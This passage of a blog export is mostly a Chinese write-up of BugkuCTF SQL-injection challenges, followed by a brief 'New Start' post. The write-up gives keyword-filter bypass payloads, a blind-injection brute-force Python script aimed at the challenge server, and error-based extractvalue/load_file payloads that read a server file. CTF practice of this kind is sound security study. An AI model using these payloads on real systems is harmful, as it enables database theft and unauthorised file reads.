select column_name,null from information_schema.columns where table_name=&#39;flag1&#39; #得列名flag1 最后0&quot; union select flag1,null from bugkusql1.flag1 #得flag 多次点进去就会注意到?id=1，说明这个很有可能是个注入题，加单引号出错，确实可以注入。 可是不知道过滤了什么，这里可以使用异或来判断有哪些关键词被过滤了。 一上来先试试行不行?id=1&#39;^(0)--+页面返回正确，再输入?id=1&#39;^(1)--+显示错误，说明如果页面显示有误那么括号里的内容应该为真。这里可以用length()函数判断有哪些关键词被过滤了。 ?id=1&#39;^(length(&#39;union&#39;)&gt;0)--+页面返回正确，说明union被过滤了。 同理，用这种方法验证一些其他的常用关键词，会发现union，select，and，or被过滤了，但是可以构造类似ununionion的形式绕过。 ?id=0&#39; ununion selselectect 1,2--+在2位上有回显 ?id=0&#39; ununionion selselectect 1,database()--+得库名web1002-1 ?id=0&#39; ununionion selselectect 1,(selselectect table_name from infoorrmation_schema.tables where table_schema=&#39;web1002-1&#39; limit 0,1)--+得表名flag1，改变limit发现另一个表hint。（这个information好坑，里面有or。。。） ?id=0&#39; ununionion selselectect 1,(selselectect column_name from infoorrmation_schema.columns where table_name=&#39;flag1&#39; limit 0,1)--+得字段名flag1，还有一个叫address。同理查出hint表里有id和contents字段。 ?id=0&#39; ununionion selselectect 1,(selselectect flag1 from flag1 limit 0,1)--+得到usOwycTju+FTUUzXosjr，这个应该是第一个flag了。 然后去访问address，因该会有下一关地址。?id=0&#39; ununionion selselectect 1,(selselectect address from flag1 limit 0,1)--+得到./Once_More.php 进入第二关，加单引号出现报错，开始注入。观察Id的回显发现union和加号都被过滤了，再试试别的关键词，sleep和substr也被过滤掉了。用ununionion后面的select也没了，换ununionion selselectect试试，这次好像没啥问题，结果不回显了。。 于是到这就注不下去了（咸鱼的我），看网上大佬们写了脚本爆破，借此机会学习下。 贴上大佬的脚本： 12345678910111213141516def flag2(): flag ='' for j in xrange(1, 100): temp = '!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~' key = 0 for i in temp: url = \"http://120.24.86.145:9004/Once_More.php?id=1'and (select locate(binary'\"+str(i)+\"',(select flag2 from flag2),\"+str(j)+\"))=\"+str(j)+\"%23\" r1 = rs.get(url) # print url if \"Hello\" in r1.text: print str(i)+\" -----\"+str(j) flag += str(i) print \"[*] : \"+flag key = 1 if key ==0: break 加点东西然后运行一下得到最终的flag 报错注入附报错注入相关知识的连接：戳这里，这个也不错，还有这个 这题链接打不开了，用别人的解题思路总结一下 题目提示不可以包含’’–’’，空格，单引号，双引号，’’union’’关键字。这里可以用换行符替换空格。 通过extractvalue报错 ?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(select%0A@@version),0x7e))成功报错 题目要求读文件双引号里面的内容（即flag），需要查询的文件路径为/var/test/key_1.php，文件名转十六进制表示0x2f7661722f746573742f6b65795f312e706870 现在读取文件 ?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))),0x7e)) 但是extractvalue只能读32位（转换成字符串只有16位），其实是被截断了，可以用substr(str,start,length)读取剩余部分id=1%0Aand%0Aextractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))%0Afrom%0A161%0Afor%0A20),0x7e)) 接下来修改偏移量把整个文件读完就可以了，最后恢复的文件内容如下： 1&lt;?php fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:\"7249f5a7fd1de602b30e6f39aea6193a\"fsdafsafdsafdsafdsafa ?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://yoursite.com/tags/SQL/"},{"name":"BugkuCTF","slug":"BugkuCTF","permalink":"http://yoursite.com/tags/BugkuCTF/"}]},{"title":"New Start","slug":"New-Start","date":"2018-08-11T14:06:25.000Z","updated":"2019-07-25T07:33:53.600Z","comments":true,"path":"2018/08/11/New-Start/","link":"","permalink":"http://yoursite.com/2018/08/11/New-Start/","excerpt":"","text":"新的开始 Hello, blog! It’s a long way to go, but it’s never too late to get started. Keep running~","categories":[],"tags":[{"name":"Life","slug":"Life","permalink":"http://yoursite.com/tags/Life/"}]}]}